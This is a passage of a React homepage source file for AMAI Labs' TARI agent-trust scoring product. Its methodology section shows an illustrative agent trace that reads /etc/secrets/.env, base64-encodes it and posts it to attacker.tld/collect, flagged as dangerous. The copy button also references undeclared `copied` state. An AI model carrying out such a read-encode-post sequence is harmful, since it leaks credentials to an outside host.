import { useState, useRef, useEffect } from "react";
import { motion, useInView, animate } from "framer-motion";
import { Link } from "react-router-dom";
import { Copy, Check, ChevronRight, ChevronLeft } from "lucide-react";
import amaiLogo from "@/assets/amai-logo-tm.png";
import { showEmailFallbackToast } from "@/lib/contact-toast";
import homeFallbackBg from "@/assets/home-fallback-bg.jpg";
import agentFleetDashboard from "@/assets/institutions-fleet.png.asset.json";
import institutionsResearch from "@/assets/institutions-research.png.asset.json";
import { useLanguage } from "@/contexts/LanguageContext";
import { pickHome } from "@/i18n/pageContent";

import { Footer } from "@/components/Footer";
import { TariGauge } from "@/components/TariGauge";

const CountUp = ({ to, prefix = "", suffix = "" }: { to: number; prefix?: string; suffix?: string }) => {
  const ref = useRef<HTMLSpanElement>(null);
  const isInView = useInView(ref, { once: true, amount: 0.5 });
  const [value, setValue] = useState(0);

  useEffect(() => {
    if (!isInView) return;
    const controls = animate(0, to, {
      duration: 1.5,
      ease: [0.16, 1, 0.3, 1],
      onUpdate: (v) => setValue(Math.round(v)),
    });
    return () => controls.stop();
  }, [isInView, to]);

  return (
    <span ref={ref} dir="ltr" className="keep-ltr">
      {prefix}{value.toLocaleString('en-US')}{suffix}
    </span>
  );
};

const Home = () => {
  const { language } = useLanguage();
  const c = pickHome(language);
  const isRtl = language === 'ar';

  const navItems = [
    { label: c.nav.score, id: "score" },
    { label: c.nav.methodology, id: "methodology" },
    { label: c.nav.install, id: "install-tari" },
    { label: c.nav.risk, id: "risk" },
    { label: c.nav.institutions, id: "institutions" },
    { label: c.nav.bureau, href: "https://bureau.amai.net", external: true },
    { label: c.nav.docs, href: "/docs" },
  ] as const;

  const [copiedTerminal, setCopiedTerminal] = useState(false);
  const [copiedPython, setCopiedPython] = useState(false);
  const [showLeftNavArrow, setShowLeftNavArrow] = useState(false);
  const [showRightNavArrow, setShowRightNavArrow] = useState(true);
  const [lightboxSrc, setLightboxSrc] = useState<string | null>(null);

  useEffect(() => {
    if (!lightboxSrc) return;
    const onKey = (e: KeyboardEvent) => { if (e.key === 'Escape') setLightboxSrc(null); };
    const prevOverflow = document.body.style.overflow;
    document.body.style.overflow = 'hidden';
    window.addEventListener('keydown', onKey);
    return () => { window.removeEventListener('keydown', onKey); document.body.style.overflow = prevOverflow; };
  }, [lightboxSrc]);
  const navListRef = useRef<HTMLUListElement>(null);

  useEffect(() => {
    const el = navListRef.current;
    if (!el) return;
    const update = () => {
      const maxScroll = el.scrollWidth - el.clientWidth;
      setShowLeftNavArrow(el.scrollLeft > 2);
      setShowRightNavArrow(el.scrollLeft < maxScroll - 2);
    };
    update();
    el.addEventListener("scroll", update, { passive: true });
    window.addEventListener("resize", update);
    return () => {
      el.removeEventListener("scroll", update);
      window.removeEventListener("resize", update);
    };
  }, []);

  const scrollNavRight = () => {
    const el = navListRef.current;
    if (!el) return;
    el.scrollTo({ left: el.scrollWidth - el.clientWidth, behavior: "smooth" });
  };

  const scrollNavLeft = () => {
    const el = navListRef.current;
    if (!el) return;
    el.scrollTo({ left: 0, behavior: "smooth" });
  };

  return (
    <div className="bg-black" dir={isRtl ? 'rtl' : 'ltr'}>
      {/* Hero */}
      <div className="h-svh md:h-screen flex flex-col">
        <div className="h-16 bg-black flex-shrink-0" />
        <div className="flex-1 flex items-center justify-center overflow-hidden relative">
          <motion.img
            src={homeFallbackBg}
            alt=""
            className="absolute inset-0 w-full h-full object-cover will-change-transform"
            initial={{ scale: 1 }}
            animate={{ scale: [1, 1.12, 1] }}
            transition={{ duration: 18, ease: "easeInOut", repeat: Infinity }}
          />
          <div className="pointer-events-none absolute inset-x-0 bottom-0 h-[55%] z-[1] bg-[radial-gradient(ellipse_at_50%_100%,rgba(166,252,252,0.14),transparent_60%)]" />
          <div className="pointer-events-none absolute inset-x-0 top-0 h-[55%] z-[1] bg-[radial-gradient(ellipse_at_50%_0%,rgba(166,252,252,0.14),transparent_60%)]" />
          <div className="relative z-10 text-center px-6 max-w-3xl mx-auto">
            <motion.img
              src={amaiLogo}
              alt="AMAI Labs"
              className="h-12 md:h-20 w-auto mx-auto mb-8 md:mb-10 brightness-110"
              initial={{ opacity: 0, scale: 0.8 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.8, delay: 0.2 }}
            />

            <motion.div
              className="mb-8 md:mb-10 max-w-xl mx-auto"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.6 }}
            >
              <p className="text-xl md:text-2xl text-white/70 font-light leading-relaxed tracking-wide whitespace-pre-line">
                {c.hero.bodyPrefix}
                <span className="text-white/95 font-normal">{c.hero.bodyHighlight}</span>
              </p>
            </motion.div>

            <motion.div
              className="mt-10 md:mt-14 flex flex-col items-center gap-4"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.8 }}
            >
              <span className="text-[10px] md:text-xs uppercase tracking-[0.35em] text-white/50 font-light">
                {c.hero.scroll}
              </span>
              <div className="relative w-8 h-14 flex items-center justify-center">
                <div className="absolute inset-x-3 top-1 bottom-1 rounded-full border border-white/15" />
                <motion.div
                  className="absolute w-1.5 h-1.5 rounded-full bg-white/80 shadow-[0_0_10px_rgba(255,255,255,0.5)]"
                  animate={{ y: [-12, 12, -12] }}
                  transition={{ duration: 2.2, ease: "easeInOut", repeat: Infinity }}
                />
              </div>
            </motion.div>
          </div>
        </div>
      </div>

      {/* Feature card */}
      <section className="relative bg-perspective-grid py-16 md:py-24 px-4 md:px-8">
        <div className="absolute inset-0 bg-gradient-to-b from-black via-black/80 to-transparent pointer-events-none" />
        <div className="max-w-[95vw] mx-auto relative z-10">
          <div className="pointer-events-none absolute -inset-3 rounded-[2rem] bg-[radial-gradient(circle_at_50%_0%,rgba(255,255,255,0.12),transparent_55%)] blur-2xl opacity-60" />
          <div className="relative overflow-hidden rounded-3xl border border-white/10 bg-white/[0.04] backdrop-blur-2xl shadow-[0_20px_80px_-20px_rgba(0,0,0,0.8),inset_0_1px_0_0_rgba(255,255,255,0.08)] min-h-[70vh] md:min-h-[80vh] flex items-center justify-center">
            <div className="pointer-events-none absolute inset-0 bg-gradient-to-br from-white/[0.06] via-transparent to-transparent" />
            <div className="pointer-events-none absolute inset-x-0 top-0 h-32 bg-gradient-to-b from-white/[0.08] to-transparent" />
            <div className="pointer-events-none absolute -top-1/2 -left-1/2 w-[200%] h-[200%] bg-[radial-gradient(circle_at_center,rgba(166,252,252,0.08),transparent_50%)]" />

            <motion.div
              className="relative z-10 flex flex-col items-center justify-center px-6 py-16 text-center max-w-5xl mx-auto"
              initial={{ scale: 0.55, opacity: 0, filter: "blur(12px)" }}
              whileInView={{ scale: 1, opacity: 1, filter: "blur(0px)" }}
              viewport={{ once: false, amount: 0.5 }}
              transition={{ duration: 1.4, ease: [0.16, 1, 0.3, 1] }}
            >
              <div className="mb-10 md:mb-14 w-full">
                <TariGauge score={812} />
              </div>
              <h2 className="text-4xl md:text-6xl lg:text-7xl font-medium tracking-tight text-white leading-[1.05]">
                {c.feature.headline}
              </h2>
              <p className="mt-8 md:mt-10 text-lg md:text-2xl lg:text-3xl font-light text-white/80 leading-snug max-w-4xl">
                {c.feature.body1}<span className="font-normal text-white/95">{c.feature.bodyHighlight}</span>
              </p>

              <motion.nav
                className="mt-16 md:mt-24"
                initial={{ y: 12 }}
                whileInView={{ y: 0 }}
                viewport={{ once: false, amount: 0.5 }}
                transition={{ duration: 0.9, delay: 0.3, ease: [0.16, 1, 0.3, 1] }}
              >
                <div className="flex items-center overflow-hidden rounded-full border border-white/10 bg-black/50 backdrop-blur-xl px-2 py-2 shadow-[0_10px_40px_-15px_rgba(0,0,0,0.9)] w-[calc(4*4rem+3*0.5rem+2*2rem+1rem)] md:w-[calc(5*8rem+4*0.5rem+2*2rem+1rem)]">
                  <button
                    type="button"
                    onClick={scrollNavLeft}
                    className={`h-7 w-7 md:h-8 md:w-8 flex-shrink-0 rounded-full bg-white/10 hover:bg-white/20 border border-white/10 flex items-center justify-center text-white/70 hover:text-white transition-all duration-300 ${showLeftNavArrow ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}
                    aria-label="Previous"
                  >
                    <ChevronLeft className="w-4 h-4" />
                  </button>
                  <ul
                    ref={navListRef}
                    className="flex items-center gap-2 overflow-x-auto scroll-smooth snap-x snap-mandatory w-[calc(4*4rem+3*0.5rem)] md:w-[calc(5*8rem+4*0.5rem)] mx-2"
                    style={{ scrollbarWidth: "none", msOverflowStyle: "none" }}
                  >
                    {navItems.map((item) => (
                      <li key={item.label} className="snap-start">
                        {'href' in item ? (
                          'external' in item && item.external ? (
                            <a href={item.href} target="_blank" rel="noopener noreferrer" className="inline-flex items-center justify-center w-16 md:w-32 px-0 py-2 md:py-2.5 rounded-full text-xs md:text-sm font-light tracking-wide text-white/70 hover:text-white hover:bg-white/[0.08] transition-all duration-300 whitespace-nowrap">
                              {item.label}
                            </a>
                          ) : (
                            <Link to={item.href} className="inline-flex items-center justify-center w-16 md:w-32 px-0 py-2 md:py-2.5 rounded-full text-xs md:text-sm font-light tracking-wide text-white/70 hover:text-white hover:bg-white/[0.08] transition-all duration-300 whitespace-nowrap">
                              {item.label}
                            </Link>
                          )
                        ) : (
                          <button type="button" onClick={() => document.getElementById(item.id)?.scrollIntoView({ behavior: 'smooth' })} className="w-16 md:w-32 px-0 py-2 md:py-2.5 rounded-full text-xs md:text-sm font-light tracking-wide text-white/70 hover:text-white hover:bg-white/[0.08] transition-all duration-300 whitespace-nowrap">
                            {item.label}
                          </button>
                        )}
                      </li>
                    ))}
                  </ul>
                  <button
                    type="button"
                    onClick={scrollNavRight}
                    className={`h-7 w-7 md:h-8 md:w-8 flex-shrink-0 rounded-full bg-white/10 hover:bg-white/20 border border-white/10 flex items-center justify-center text-white/70 hover:text-white transition-all duration-300 ${showRightNavArrow ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}
                    aria-label="Next"
                  >
                    <ChevronRight className="w-4 h-4" />
                  </button>
                </div>
              </motion.nav>
            </motion.div>
          </div>
        </div>
      </section>

      {/* Section 3 SCORE */}
      <section id="score" className="relative bg-perspective-grid py-24 md:py-40 px-4 md:px-8 overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/40 to-transparent pointer-events-none" />
        <div className="pointer-events-none absolute -left-40 top-1/3 w-[520px] h-[520px] rounded-full bg-[radial-gradient(circle_at_center,rgba(166,252,252,0.06),transparent_70%)]" />

        <div className="relative z-10 max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-16 lg:gap-20 items-start">
          <motion.div className="lg:col-span-7 text-start" initial={{ opacity: 0, y: 24 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.3 }} transition={{ duration: 0.9, ease: [0.16, 1, 0.3, 1] }}>
            <div className="flex items-center gap-3 mb-8">
              <span className="h-px w-10 bg-white/30" />
              <span className="text-[11px] tracking-[0.35em] font-light text-white/50 uppercase">{c.score.eyebrow}</span>
            </div>
            <h2 className="text-4xl md:text-6xl lg:text-7xl font-light tracking-tight text-white leading-[1.05]">
              {c.score.titleA}<br />{c.score.titleB}
            </h2>
            <p className="mt-10 md:mt-12 text-lg md:text-xl font-light text-white/70 leading-relaxed max-w-2xl">
              {c.score.body1a}<span className="font-normal text-white">{c.score.body1Highlight}</span>{c.score.body1b}
              <br /><br />
              {c.score.body2}
            </p>
            <div className="mt-16 md:mt-20 pt-10 border-t border-white/10 max-w-2xl">
              <p className="text-2xl md:text-4xl lg:text-5xl font-light tracking-tight text-white leading-[1.15]">
                {c.score.pullA}<span className="italic text-white/90">{c.score.pullEm}</span>
                <br />
                <span className="text-white/50">{c.score.pullB}</span>
              </p>
            </div>
          </motion.div>

          <motion.div className="lg:col-span-5 lg:pt-4" initial={{ opacity: 0, y: 24 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.2 }} transition={{ duration: 1, delay: 0.15, ease: [0.16, 1, 0.3, 1] }}>
            <div className={`relative ${isRtl ? 'pr-8 md:pr-10' : 'pl-8 md:pl-10'}`}>
              <div className={`absolute ${isRtl ? 'right-0' : 'left-0'} top-2 bottom-2 w-px bg-gradient-to-b from-cyan-300/40 via-emerald-300/30 via-amber-300/30 to-red-400/40`} />
              {c.score.bands.map((band, i) => {
                const colors = [
                  { color: 'bg-cyan-300', text: 'text-cyan-200' },
                  { color: 'bg-emerald-300', text: 'text-emerald-200' },
                  { color: 'bg-amber-300', text: 'text-amber-200' },
                  { color: 'bg-red-400', text: 'text-red-300' },
                  { color: 'bg-white/40', text: 'text-white/60' },
                ][i];
                return (
                  <motion.div key={band.range} className="relative py-6 md:py-7 first:pt-0" initial={{ opacity: 0, x: 16 }} whileInView={{ opacity: 1, x: 0 }} viewport={{ once: true, amount: 0.4 }} transition={{ duration: 0.7, delay: 0.1 + i * 0.08, ease: [0.16, 1, 0.3, 1] }}>
                    <span className={`absolute ${isRtl ? '-right-[34px] md:-right-[42px]' : '-left-[34px] md:-left-[42px]'} top-8 md:top-9 flex items-center justify-center`}>
                      <span className={`absolute w-3.5 h-3.5 rounded-full ${colors.color} opacity-20 blur-[3px]`} />
                      <span className={`relative w-1.5 h-1.5 rounded-full ${colors.color}`} />
                    </span>
                    <div className={`text-2xl md:text-3xl font-light tracking-tight ${colors.text} keep-ltr`} dir="ltr">
                      {band.range}
                    </div>
                    <div className="mt-2 text-sm md:text-base font-light text-white/60 leading-relaxed max-w-md">
                      {band.label}
                    </div>
                  </motion.div>
                );
              })}
            </div>
          </motion.div>
        </div>
      </section>

      {/* Section 4 HOW IT WORKS */}
      <section id="methodology" className="relative bg-perspective-grid py-24 md:py-40 px-4 md:px-8 overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/40 to-transparent pointer-events-none" />
        <div className="pointer-events-none absolute -right-40 top-1/4 w-[520px] h-[520px] rounded-full bg-[radial-gradient(circle_at_center,rgba(166,252,252,0.05),transparent_70%)]" />

        <div className="relative z-10 max-w-7xl mx-auto">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-20 items-start">
            <motion.div className="lg:col-span-7 text-start" initial={{ opacity: 0, y: 24 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.3 }} transition={{ duration: 0.9, ease: [0.16, 1, 0.3, 1] }}>
              <div className="flex items-center gap-3 mb-8">
                <span className="h-px w-10 bg-white/30" />
                <span className="text-[11px] tracking-[0.35em] font-light text-white/50 uppercase">{c.how.eyebrow}</span>
              </div>
              <h2 className="text-4xl md:text-6xl lg:text-7xl font-light tracking-tight text-white leading-[1.05]">
                {c.how.titleA}<br />{c.how.titleB}
              </h2>
              <p className="mt-10 md:mt-12 text-lg md:text-xl font-light text-white/70 leading-relaxed max-w-2xl">
                {c.how.body1}
                <br /><br />
                {c.how.body2}
              </p>
            </motion.div>

            <motion.div className="lg:col-span-5" initial={{ opacity: 0, y: 24 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.2 }} transition={{ duration: 1, delay: 0.15, ease: [0.16, 1, 0.3, 1] }}>
              <div className="relative rounded-2xl border border-white/10 bg-black/60 backdrop-blur-xl overflow-hidden shadow-[0_20px_80px_-20px_rgba(0,0,0,0.9)]" dir="ltr">
                <div className="flex items-center justify-between px-5 py-3 border-b border-white/10 bg-white/[0.02]">
                  <div className="flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-red-400/80" />
                    <span className="w-2 h-2 rounded-full bg-amber-300/80" />
                    <span className="w-2 h-2 rounded-full bg-emerald-400/80" />
                  </div>
                  <span className="text-[10px] tracking-[0.3em] uppercase text-white/40 font-light">
                    {c.how.traceLabel}
                  </span>
                  <span className="flex items-center gap-1.5 text-[10px] text-white/50 font-light">
                    <motion.span className="w-1.5 h-1.5 rounded-full bg-emerald-400" animate={{ opacity: [0.4, 1, 0.4] }} transition={{ duration: 1.6, repeat: Infinity }} />
                    agent_7f2a
                  </span>
                </div>

                <div className="px-6 py-8 font-mono text-sm space-y-3">
                  {[
                    { time: "00.014", call: "list_files", scope: "/workspace", danger: false },
                    { time: "00.087", call: "read_file", scope: "/etc/secrets/.env", danger: true },
                    { time: "00.203", call: "base64_encode", scope: "buffer", danger: true },
                    { time: "00.412", call: "http_post", scope: "attacker.tld/collect", danger: true },
                    { time: "00.518", call: "return", scope: "task_complete", danger: false },
                  ].map((row, i) => (
                    <motion.div key={i} className="flex items-center gap-4" initial={{ opacity: 0, x: -8 }} whileInView={{ opacity: 1, x: 0 }} viewport={{ once: true, amount: 0.5 }} transition={{ duration: 0.5, delay: 0.3 + i * 0.25 }}>
                      <span className="text-white/30 text-xs tabular-nums w-12">{row.time}</span>
                      <span className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${row.danger ? 'bg-red-400' : 'bg-white/30'}`} />
                      <span className={`${row.danger ? 'text-red-300' : 'text-white/80'} font-light`}>{row.call}</span>
                      <span className="text-white/30 font-light truncate">{row.scope}</span>
                    </motion.div>
                  ))}
                </div>

                <motion.div className="mx-6 mb-6 mt-2 border border-red-400/30 bg-red-400/[0.04] rounded-lg px-4 py-3" initial={{ opacity: 0, y: 8 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.5 }} transition={{ duration: 0.6, delay: 1.6 }}>
                  <div className="flex items-center justify-between gap-4">
                    <div>
                      <div className="text-[10px] tracking-[0.3em] uppercase text-red-300/80 font-light">{c.how.flagLabel}</div>
                      <div className="mt-1 text-sm font-light text-red-200">{c.how.flagName}</div>
                    </div>
                    <div className="text-right">
                      <div className="text-[10px] tracking-[0.2em] uppercase text-white/40 font-light">{c.how.deltaLabel}</div>
                      <div className="mt-1 text-lg font-light text-red-300 tabular-nums">−247</div>
                    </div>
                  </div>
                </motion.div>
              </div>

              <div className="mt-4 text-[11px] tracking-[0.25em] uppercase text-white/30 font-light text-center keep-ltr" dir="ltr">
                {c.how.chain}
              </div>
            </motion.div>
          </div>

          <ol className="mt-20 md:mt-24 grid grid-cols-1 md:grid-cols-3 gap-8 md:gap-10 lg:gap-14">
            {c.how.steps.map((step, i) => (
              <motion.li key={step.title} className="relative pt-6 border-t border-white/10" initial={{ opacity: 0, y: 12 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.4 }} transition={{ duration: 0.7, delay: 0.1 + i * 0.1, ease: [0.16, 1, 0.3, 1] }}>
                <span className="block text-xs tracking-[0.3em] font-light text-white/40 mb-3 keep-ltr" dir="ltr">0{i + 1}</span>
                <div className="text-xl md:text-2xl font-light tracking-tight text-white">{step.title}</div>
                <div className="mt-2 text-sm md:text-base font-light text-white/60 leading-relaxed">{step.body}</div>
              </motion.li>
            ))}
          </ol>

          <div className="mt-16 md:mt-20 pt-10 border-t border-white/10">
            <p className="text-2xl md:text-4xl lg:text-5xl font-light tracking-tight text-white leading-[1.15]">
              {c.how.pullA}<br /><span className="text-white/50">{c.how.pullB}</span>
            </p>
            <div className="mt-10">
              <a href="/methodology" className="inline-flex items-center gap-2 text-sm font-light text-white/60 hover:text-white transition-colors duration-300 border-b border-white/20 hover:border-white/60 pb-1">
                {c.how.methodLink}<span aria-hidden>{isRtl ? '←' : '→'}</span>
              </a>
            </div>
          </div>
        </div>
      </section>

      {/* Section 5 RUN IT */}
      <section id="install-tari" className="relative bg-[#fafafa] py-24 md:py-40 px-4 md:px-8 overflow-hidden">
        <div className="absolute inset-0 opacity-[0.07] pointer-events-none" style={{ backgroundImage: "linear-gradient(#0055ff 1px, transparent 1px), linear-gradient(90deg, #0055ff 1px, transparent 1px)", backgroundSize: "40px 40px" }} />
        <div className="absolute inset-0 opacity-[0.04] pointer-events-none" style={{ backgroundImage: "linear-gradient(#0055ff 1px, transparent 1px), linear-gradient(90deg, #0055ff 1px, transparent 1px)", backgroundSize: "8px 8px" }} />
        <div className="absolute inset-x-0 top-0 h-40 bg-gradient-to-b from-black to-transparent pointer-events-none" />

        <div className="relative z-10 max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-16 lg:gap-20 items-start">
          <motion.div className="lg:col-span-5 text-start" initial={{ opacity: 0, y: 24 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.3 }} transition={{ duration: 0.9, ease: [0.16, 1, 0.3, 1] }}>
            <div className="flex items-center gap-3 mb-8">
              <span className="h-px w-10 bg-black/30" />
              <span className="text-[11px] tracking-[0.35em] font-light text-black/80 uppercase">{c.run.eyebrow}</span>
            </div>
            <h2 className="text-4xl md:text-6xl lg:text-7xl font-light tracking-tight text-black leading-[1.05]">
              {c.run.titleA}<br />{c.run.titleB}
            </h2>
            <p className="mt-10 md:mt-12 text-lg md:text-xl font-light text-black/70 leading-relaxed max-w-xl">
              <span className="text-black font-normal keep-ltr" dir="ltr">{c.run.cmd}</span>{c.run.body1a}
              <br /><br />
              {c.run.body2}
            </p>
            <div className="mt-10">
              <a href="/docs" className="inline-flex items-center gap-2 text-sm font-normal text-white bg-black hover:bg-black/80 transition-colors duration-300 px-5 py-2.5 rounded-full border border-black">
                {c.run.docs}<span aria-hidden>{isRtl ? '←' : '→'}</span>
              </a>
            </div>
            <div className="mt-16 md:mt-20 pt-10 max-w-xl">
              <p className="text-2xl md:text-4xl lg:text-5xl font-light tracking-tight text-black leading-[1.15]">
                {c.run.pullA}<br /><span className="text-black/50">{c.run.pullB}</span>
              </p>
            </div>
          </motion.div>

          <motion.div className="lg:col-span-7 lg:mt-14" initial={{ opacity: 0, y: 24 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.2 }} transition={{ duration: 1, delay: 0.15, ease: [0.16, 1, 0.3, 1] }}>
            <div className="relative">
              <div className="absolute -inset-3 -z-10 rounded-[32px] bg-gradient-to-br from-white/10 via-white/5 to-transparent blur-2xl opacity-60" />
              <div className="relative bg-[hsl(var(--gray-900))] rounded-3xl overflow-hidden border border-white/10 shadow-2xl after:absolute after:inset-x-0 after:top-0 after:h-px after:bg-gradient-to-r after:from-transparent after:via-white/20 after:to-transparent keep-ltr" dir="ltr">
                <div className="flex items-center justify-between px-5 py-3.5 border-b border-white/[0.08]">
                  <div className="flex items-center gap-2">
                    <span className="w-2.5 h-2.5 rounded-full bg-red-400/80" />
                    <span className="w-2.5 h-2.5 rounded-full bg-amber-300/80" />
                    <span className="w-2.5 h-2.5 rounded-full bg-emerald-400/80" />
                  </div>
                  <span className="text-[10px] tracking-[0.3em] uppercase text-white/50 font-light">{c.run.terminalLabel}</span>
                  <button
                    type="button"
                    onClick={() => {
                      navigator.clipboard.writeText(`pip install amai-tari\n\nfrom tari import TARIInstrument\ntari = TARIInstrument("my-agent", store="./.tari")\nprovider, exporter = tari.start_otel_capture()\n# ... run your agent ...\ntari.score(tari.trajectory_from_exporter(exporter))`);
                      setCopied(true);
                      setTimeout(() => setCopied(false), 2000);
                    }}
                    className="group flex items-center gap-2 px-3.5 py-1.5 rounded-full border border-white/10 bg-white/[0.05] hover:bg-white/[0.10] hover:border-white/20 transition-all duration-300"
                  >
                    {copied ? (
                      <>
                        <Check className="w-3.5 h-3.5 text-emerald-300" strokeWidth={2} />
                        <span className="text-[10px] tracking-[0.2em] uppercase font-light text-emerald-100">{c.run.copied}</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-3.5 h-3.5 text-white/60 group-hover:text-white/90 transition-colors duration-300" strokeWidth={2} />
                        <span className="text-[10px] tracking-[0.2em] uppercase font-light text-white/60 group-hover:text-white/90 transition-colors duration-300">{c.run.copy}</span>
                      </>
                    )}
                  </button>
                </div>

                <div className="px-6 py-8 md:px-8 md:py-10 font-mono text-sm md:text-[15px] leading-relaxed">
                  <div className="flex gap-4">
                    <div className="select-none text-right text-white/20 font-light tabular-nums">
                      <div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div>
                    </div>
                    <div className="space-y-0.5">
                      <div><span className="text-sky-300">pip install</span> <span className="text-white/90">amai-tari</span></div>
                      <div><span className="text-purple-400">from</span> <span className="text-white/90">tari</span> <span className="text-purple-400">import</span> <span className="text-white/90">TARIInstrument</span></div>
                      <div><span className="text-white/90">tari</span> <span className="text-white/50">=</span> <span className="text-amber-400">TARIInstrument</span><span className="text-white/50">(</span><span className="text-lime-400">"my-agent"</span><span className="text-white/50">,</span> <span className="text-white/90">store</span><span className="text-white/50">=</span><span className="text-lime-400">"./.tari"</span><span className="text-white/50">)</span></div>
                      <div><span className="text-white/90">provider</span><span className="text-white/50">,</span> <span className="text-white/90">exporter</span> <span className="text-white/50">=</span> <span className="text-white/90">tari</span><span className="text-white/50">.</span><span className="text-sky-400">start_otel_capture</span><span className="text-white/50">()</span></div>
                      <div><span className="text-white/40 italic"># ... run your agent ...</span></div>
                      <div><span className="text-white/90">tari</span><span className="text-white/50">.</span><span className="text-sky-400">score</span><span className="text-white/50">(</span><span className="text-white/90">tari</span><span className="text-white/50">.</span><span className="text-sky-400">trajectory_from_exporter</span><span className="text-white/50">(</span><span className="text-white/90">exporter</span><span className="text-white/50">))</span></div>
                    </div>
                  </div>
                </div>

                <div className="flex items-center justify-between px-5 py-3.5 border-t border-white/[0.08]">
                  <span className="text-[10px] tracking-[0.2em] uppercase text-white/50 font-light">{c.run.footerRuns}</span>
                  <span className="flex items-center gap-1.5 text-[10px] text-white/60 font-light">
                    <motion.span className="w-1.5 h-1.5 rounded-full bg-emerald-400" animate={{ opacity: [0.4, 1, 0.4] }} transition={{ duration: 1.6, repeat: Infinity }} />
                    {c.run.footerPrivacy}
                  </span>
                </div>
              </div>
            </div>

            <p className="mt-5 text-xs md:text-sm text-black/70 font-light tracking-wide text-center">
              {c.run.caption}
            </p>

            <motion.div className="mt-12 md:mt-16" initial={{ opacity: 0, y: 24 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.3 }} transition={{ duration: 0.9, delay: 0.2, ease: [0.16, 1, 0.3, 1] }}>
              <div className="flex items-center gap-3 mb-6">
                <span className="text-xs md:text-sm tracking-[0.25em] font-medium text-black uppercase">{c.run.whatYouGet}</span>
                <span className="h-px flex-1 bg-black/20" />
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-x-10 gap-y-6">
                {c.run.benefits.map((item, i) => (
                  <motion.div key={item.lead} className="text-sm md:text-base font-light text-black/80 leading-relaxed" initial={{ opacity: 0, y: 12 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.5 }} transition={{ duration: 0.7, delay: 0.1 + i * 0.08, ease: [0.16, 1, 0.3, 1] }}>
                    <span className="font-normal text-black block">{item.lead}</span>
                    <span className="block mt-1 text-black/70">{item.body}</span>
                  </motion.div>
                ))}
              </div>
            </motion.div>
          </motion.div>
        </div>
      </section>

      {/* Section 6 RISK */}
      <section id="risk" className="relative bg-perspective-grid py-24 md:py-40 px-4 md:px-8 overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/40 to-transparent pointer-events-none" />
        <div className="relative z-10 max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-16 lg:gap-20 items-start">
          <motion.div className="lg:col-span-5 text-start" initial={{ opacity: 0, y: 24 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.3 }} transition={{ duration: 0.9, ease: [0.16, 1, 0.3, 1] }}>
            <div className="flex items-center gap-3 mb-8">
              <span className="h-px w-10 bg-white/30" />
              <span className="text-[11px] tracking-[0.35em] font-light text-white/50 uppercase">{c.risk.eyebrow}</span>
            </div>
            <h2 className="text-4xl md:text-6xl lg:text-7xl font-light tracking-tight text-white leading-[1.05]">
              {c.risk.title}
            </h2>
            <p className="mt-10 md:mt-12 text-lg md:text-xl font-light text-white/70 leading-relaxed max-w-xl">
              {c.risk.body1}<br /><br />{c.risk.body2}
            </p>
            <div className="mt-16 md:mt-20 pt-10 border-t border-white/10 max-w-xl">
              <p className="text-2xl md:text-4xl lg:text-5xl font-light tracking-tight text-white/50 leading-[1.15]">
                {c.risk.pullDim}<br /><span className="text-white">{c.risk.pullBright}</span>
              </p>
            </div>
          </motion.div>

          <div className="lg:col-span-7 flex flex-col gap-8 md:gap-12">
            <motion.div className="border-b border-white/10 pb-8 md:pb-12" initial={{ opacity: 0, y: 24 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.5 }} transition={{ duration: 0.9, ease: [0.16, 1, 0.3, 1] }}>
              <div className="text-5xl md:text-7xl lg:text-8xl font-light tracking-tight text-[hsl(var(--trust-red)/0.8)] leading-none">
                <CountUp to={16} suffix="%" />
              </div>
              <p className="mt-4 text-base md:text-lg font-light text-white/70 max-w-md">{c.risk.stat1}</p>
              <span className="mt-2 inline-block text-[11px] tracking-[0.2em] uppercase text-white/40 font-light keep-ltr" dir="ltr">{c.risk.stat1Src}</span>
            </motion.div>

            <motion.div className="border-b border-white/10 pb-8 md:pb-12" initial={{ opacity: 0, y: 24 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.5 }} transition={{ duration: 0.9, delay: 0.15, ease: [0.16, 1, 0.3, 1] }}>
              <div className="text-5xl md:text-7xl lg:text-8xl font-light tracking-tight text-[hsl(var(--trust-red)/0.8)] leading-none">
                <CountUp to={200000} prefix="~" />
              </div>
              <p className="mt-4 text-base md:text-lg font-light text-white/70 max-w-md">{c.risk.stat2}</p>
              <span className="mt-2 inline-block text-[11px] tracking-[0.2em] uppercase text-white/40 font-light">{c.risk.stat2Src}</span>
            </motion.div>

